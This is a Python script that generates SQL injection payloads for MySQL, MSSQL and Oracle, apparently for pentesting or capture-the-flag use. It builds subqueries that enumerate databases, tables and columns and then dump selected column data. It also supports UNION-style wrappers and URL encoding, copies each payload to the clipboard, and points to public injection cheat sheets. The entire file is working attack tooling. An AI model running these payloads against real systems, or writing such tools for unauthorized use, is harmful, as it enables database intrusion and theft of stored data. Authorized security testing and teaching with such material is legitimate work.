import argparse
import urllib.parse
import pyperclip

# pyperclip.copy('The text to be copied to the clipboard.')


def str2bool(v):
    if isinstance(v, bool):
       return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def ToHexString(s):
    return "0x" + "".join("{:02x}".format(ord(c)) for c in s)



def printCmd(prefix, columns, source, suffex):
    sqli = prefix + ' ' + columns + ' ' + source + suffex 
    
    if args.URLEncodePayload and not args.URLEncodeAll:
        prefix = urllib.parse.quote(prefix)
        columns = urllib.parse.quote(columns)
        source = urllib.parse.quote(source)
        suffex = urllib.parse.quote(suffex)
        sqli = urllib.parse.quote(sqli)

    if args.payload_wrapper and "**" in args.payload_wrapper:
        output = args.payload_wrapper.replace('**', source).replace('*', columns)
    elif args.payload_wrapper:
        output = args.payload_wrapper.replace('*', sqli)
    else:
        output = sqli

    if args.URLEncodeAll:
        output = urllib.parse.quote(output)
  
    print(output)
    pyperclip.copy(output)




parser = argparse.ArgumentParser(description='')

database_group = parser.add_argument_group('Database options')
database_group.add_argument('--dbs', '-D', help='database type [mysql | mssql | etc...] # todo: oracle, sqlite...')
database_group.add_argument('--database', '-d', help='database')
database_group.add_argument('--table', '-t', help='table')
database_group.add_argument('--columns', '-c', help='columns')

payload_group = parser.add_argument_group('Paylod options')
payload_group.add_argument('--payload_wrapper', '-p', help='Wraps payload in wrapper. Replace \'*\' in string.. OR for UNION based injections: replace * with columns and ** with source.')
payload_group.add_argument("--isSingleRowOutput", '-s', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="wraps payload in GROUP_CONCAT()")


encoding_group = parser.add_argument_group('Encoding options')
encoding_ma_group = encoding_group.add_mutually_exclusive_group()
encoding_ma_group.add_argument("--URLEncodeAll", '-ea', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes entire command")
encoding_ma_group.add_argument("--URLEncodePayload", '-ep', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes Payload")

args = parser.parse_args()


if not args.dbs:
    print("\n[!] Please supply database type: --dbs [mysql, mssql, oracle, sqlite, etc..]")
    print("""
            Find version:
    Database type	    Query
    Microsoft, MySQL    SELECT @@version
                                                                (non error = database type)
                                                                Microsoft SQL: (SELECT STRING_AGG('foo','bar')
                                                                MySQL:         (SELECT GROUP_CONCAT('test','me'))
    Oracle              SELECT banner FROM v$version
    PostgreSQL	        SELECT version()
    """)
    print("\nResources:")
    print("Portswigger Cheat Sheet:\n\thttps://portswigger.net/web-security/sql-injection/cheat-sheet")
    print("Payloads All the Things (find error based payloads):\n\thttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection")
    exit()

# Payloads help / Resources
if args.dbs == 'mysql':
    print("\nPaylods All the Things (mysql): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md\n\n")
elif args.dbs == 'mssql':
    print("\nPaylods All the Things (mssql): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md\n\n")
elif args.dbs == 'oracle':
    print("\nPaylods All the Things (oracle): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md")
    print("Practice Online - Playground: https://www.oracle.com/database/technologies/olracle-live-sql.html\n\n")



# databases
if (not args.database):
    print('Dump datbase')
    if args.dbs == 'mysql':
        prefix = '(SELECT DISTINCT'
        source = 'from information_schema.tables'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = 'GROUP_CONCAT(DISTINCT table_schema)'
            # cmd = '(SELECT GROUP_CONCAT(DISTINCT table_schema) from information_schema.tables)'
        else:
            columns = 'table_schema'
            # cmd = '(SELECT DISTINCT table_schema from information_schema.tables)'
    elif args.dbs == 'mssql':
        prefix = '(SELECT DISTINCT'
        source = 'FROM master..sysdatabases'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "STRING_AGG(name,',')" 
            # cmd = "(SELECT DISTINCT STRING_AGG(name,',') FROM master..sysdatabases)"
        else:
            columns = "name"
            # cmd = "(SELECT DISTINCT name FROM master..sysdatabases)"
    elif args.dbs == 'oracle':
        prefix = '(SELECT DISTINCT'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "LISTAGG(owner,',')" 
            source = 'from (select distinct owner from all_tables)'
        else:
            columns = "owner"
            source = 'from all_tables'
            
    printCmd(prefix, columns, source, suffex)


# list tables
if (args.database and not args.table):
    print('Dump tables')
    database_hex = ToHexString(args.database)
    if args.dbs == 'mysql':
        prefix = '(SELECT DISTINCT'
        source = f'from information_schema.tables WHERE table_schema = {database_hex}'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "GROUP_CONCAT(DISTINCT table_name)"
            # cmd = f'(SELECT GROUP_CONCAT(DISTINCT table_name) from information_schema.tables WHERE table_schema = {database_hex})'
        else:
            columns = "table_name"
            # cmd = f'(SELECT table_name from information_schema.tables WHERE table_schema = {database_hex})'
    elif args.dbs == 'mssql':
        prefix = '(SELECT DISTINCT'
        source = f'FROM {args.database}.information_schema.tables'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "STRING_AGG(table_name, ',')"
            # cmd = f"(SELECT DISTINCT STRING_AGG(table_name, ',') FROM {args.database}.information_schema.tables)"
        else:
            columns = "table_name"
            # cmd = f"(SELECT DISTINCT table_name FROM {args.database}.information_schema.tables)"
    elif args.dbs == 'oracle':
        prefix = '(SELECT DISTINCT'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "LISTAGG(table_name,',')" 
            source = f"FROM (select distinct table_name from all_tables where owner = '{args.database}')"
        else:
            columns = "table_name"
            source = f"from all_tables where owner = '{args.database}'"
    printCmd(prefix, columns, source, suffex)
    

# list columns
if (args.database and args.table and not args.columns):
    print('Dump columns')
    database_hex = ToHexString(args.database)
    tables_hex = ToHexString(args.table)

    if args.dbs == 'mysql':
        prefix = '(SELECT DISTINCT'
        source = f'from information_schema.columns WHERE table_schema = {database_hex} AND table_name = {tables_hex}'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "GROUP_CONCAT(DISTINCT column_name)"
            # cmd = f'(SELECT GROUP_CONCAT(DISTINCT column_name) from information_schema.columns WHERE table_schema = {database_hex} AND table_name = {tables_hex})'
        else:
            columns = "column_name"
            # cmd = f'(SELECT column_name from information_schema.columns WHERE table_schema = {database_hex} AND table_name = {tables_hex})'
    elif args.dbs == 'mssql':
        prefix = '(SELECT DISTINCT'
        source = f"FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}'"
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "STRING_AGG(column_name, ',')"
            # cmd = f"(SELECT DISTINCT STRING_AGG(column_name, ',') FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}')"
        else:
            columns = "column_name"
            # cmd = f"(SELECT DISTINCT column_name FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}')"
    elif args.dbs == 'oracle':
        prefix = '(SELECT DISTINCT'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = "LISTAGG(column_name,',')" 
            source = f"FROM (select distinct column_name FROM all_tab_columns WHERE table_name = '{args.table}' and owner = '{args.database}')"
        else:
            columns = "column_name"
            source = f"FROM all_tab_columns WHERE table_name = '{args.table}' and owner = '{args.database}'"
    printCmd(prefix, columns, source, suffex)
    

# list data
if (args.database and args.table and args.columns):
    print('Dump data')
    columns = args.columns.split(',')

    if args.dbs == 'mysql':
        cmd = ",0x3a,".join(columns)
        prefix = '(SELECT DISTINCT'
        source = f'from {args.database}.{args.table}'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = f'GROUP_CONCAT({cmd})'
            # cmd = f'(SELECT GROUP_CONCAT({cmd}) from {args.database}.{args.table})'
        else:
            columns = f'{cmd}'
            # cmd = f'(SELECT concat({cmd}) from {args.database}.{args.table})'

    elif args.dbs == 'mssql':
        cmd = "+':'+".join(columns)

        prefix = '(SELECT DISTINCT'
        source = f"FROM {args.database}..{args.table}"
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = f"STRING_AGG({cmd}, ',')"
            # cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
        else:
            columns = f'{cmd}'
            # cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
    elif args.dbs == 'oracle':
        cmd = "||':'||".join(columns)

        prefix = '(SELECT DISTINCT'
        source = f'FROM {args.table}'
        suffex = ')'
        if (args.isSingleRowOutput):
            columns = f"LISTAGG({cmd},',')" 
        else:
            columns = f"{cmd}"
    printCmd(prefix, columns, source, suffex)
    






